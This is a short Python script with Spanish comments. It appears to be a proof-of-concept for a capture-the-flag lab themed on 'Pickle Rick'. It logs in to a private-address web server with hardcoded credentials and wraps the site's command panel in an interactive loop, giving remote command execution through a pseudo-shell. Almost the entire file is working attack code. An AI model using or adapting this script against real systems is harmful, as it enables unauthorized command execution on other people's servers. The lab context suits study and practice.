import requests as re

# Se inicia la variable sesion para guardar las cookies
sesion = re.Session()

# Defino las constantes del PoC de requests + session
LOGIN_ENDPOINT = 'http://10.128.167.86/login.php'
CREDENCIALES = {
    'username' : 'R1ckRul3s',
    'password' : 'Wubbalubbadubdub',
    'sub' : 'Login'
}

# Defino el ednpoint y el payload necesarios para RCE
RCE_ENDPOINT = 'http://10.128.167.86/portal.php'

# Con esta func los comando que se ejecuten seran dinamicos, como una pseudshell
def ejecutar_comandos(cmd):
    PAYLOAD_DIN = {
        'command' : cmd, # Se ejecuta los comandos que escribimos desde la terminal
        'sub': 'Execute'
    }

    # Mandamos el payload al servidor cada vez que se llame a la funcion
    rce_respuesta = sesion.post(RCE_ENDPOINT, data = PAYLOAD_DIN)
    
    if rce_respuesta.status_code == 200:
        # Se intenta limpiar la salida y asi comprobar si hubo o no respuesta
        try:
            return rce_respuesta.text.split('<pre>')[1].split('</pre>')[0].strip()
        except IndexError:
            return "[!] Comando sin salida o bloqueado."
    else:
        return f"[!] Error HTTP: {rce_respuesta.status_code}"

# Ahora hay que acceder con el metodo POST (Endpoint + credenciales)
estado_login = sesion.post(LOGIN_ENDPOINT, data = CREDENCIALES)

# Se anaden las siguientes comprobaciones para verificar el resultado
if estado_login.status_code == 200:
    print('Peticion de login enviada. Verificando...')
    if 'Command Panel' in estado_login.text:
        print(f'Login exitoso! Mostrando las cookies de sesion: {sesion.cookies}')
        # Tras el login exitoso entraremos en un bucle While para ejecutar RCE dinamicamente
        print('-' * 50)
        print("Consola interactiva. Escribe 'exit' si deseas salir.")
        print('-' * 50)
        while True:
            comando_recibido = input('pickle-rick@usuario-nonroot:~$ ') # Input para guardar los comandos a ejecutar
            # La siguiente condition comprueba si el usuario desea salir de la pseudoshell
            if comando_recibido.lower() == 'exit':
                print('Cerrando la conexion...')
                break
            else:
                rce_respuesta = ejecutar_comandos(comando_recibido) # Llamando a la siguiente funcion
                print(rce_respuesta)
    else:
        print('Login fallido!')
else:
    print('Error de conexion!')
